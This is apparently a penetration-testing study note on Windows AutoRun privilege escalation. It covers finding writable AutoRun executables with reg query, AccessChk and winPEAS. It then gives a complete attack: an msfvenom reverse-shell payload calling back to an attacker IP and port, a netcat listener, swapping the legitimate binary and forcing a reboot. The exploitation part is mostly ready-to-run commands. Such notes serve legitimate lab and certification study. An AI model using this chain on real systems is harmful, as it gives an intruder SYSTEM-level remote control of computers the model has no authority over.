
# AutoRuns
AutoRuns are commands that can be configured to *run at startup with elevated privileges*. They are configured in the [registry](../../../computers/windows/registry.md). These can be abused for privilege escalation *if you're able to write to the executable* as well as restart the system.
## Enumeration
### Manual Enumeration
You can use `reg query` to enumerate for AutoRun executables manually:
```powershell
PS C:\Users\admin> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    VBoxTray    REG_EXPAND_SZ    %SystemRoot%\system32\VBoxTray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
```
The output shows that "SecurityHealth" "VBoxTray" and "My Program" are all AutoRun executables. Next, we can use [AccessChk.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) (from SysInternals) to check which of these we have permissions to modify:
```powershell
PS C:\Users\admin> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WINDOWS-10-OSCP\vboxuser
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```
The output if for `program.exe` and shows that we (all users) have full access to the file.
### Automated Enumeration
Use [winPEAS](../../../cybersecurity/TTPs/actions-on-objective/tools/winPEAS.md) and its `applicationsinfo` module to check for AutoRun executables. Check in the section titled "Autorun Applications":
```powershell
.\winPEASany.exe quiet applicationsinfo

...

 [+] Autorun Applications(T1010)
   [?] Check if you can modify other users AutoRuns binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
    Folder: C:\Windows\system32
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\system32\SecurityHealthSystray.exe
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    RegPerms: Administrators [TakeOwnership GenericAll]
   =================================================================================================

    Folder: C:\Windows\system32
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\system32\VBoxTray.exe
    FilePerms: Administrators [AllAccess]
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    RegPerms: Administrators [TakeOwnership GenericAll]
   =================================================================================================

    Folder: C:\Program Files\Autorun Program
    FolderPerms: Administrators [AllAccess]
    File: C:\Program Files\Autorun Program\program.exe
    FilePerms: Everyone [AllAccess], Administrators [AllAccess]
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    RegPerms: Administrators [TakeOwnership GenericAll]
   =================================================================================================

...
```
In the above output, the file called `program.exe` is an AutoRun program with "AllAccess" file permissions for every user. 
## Exploitation
After verifying that `program.exe` is an AutoRun that we can modify, we can replace it with whatever executable we want. Let's replace it with a [reverse shell](../../../cybersecurity/TTPs/exploitation/rev-shell.md) from [MSFvenom](../../../cybersecurity/TTPs/exploitation/tools/metasploit.md#MSFvenom):
### Create the Revshell
```bash
┌─[25-07-28 19:11:00]:(root@10.0.2.15)-[~/tibs]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.69.4 LPORT=44444 -f exe -o program.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: program.exe
```
#### Start your listener
```bash
nc -lvp 44444
```
### Replace the Binary & Restart Computer
Replace the binary with your revshell (make sure to make a copy of the original first). Then, to execute the binary, *you'll have to restart the target machine*. If you try to just execute the program, Windows Defender may stop it.
```powershell
shutdown /r /t 0 
```


> [!Resources]
> - [AccessChk.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) 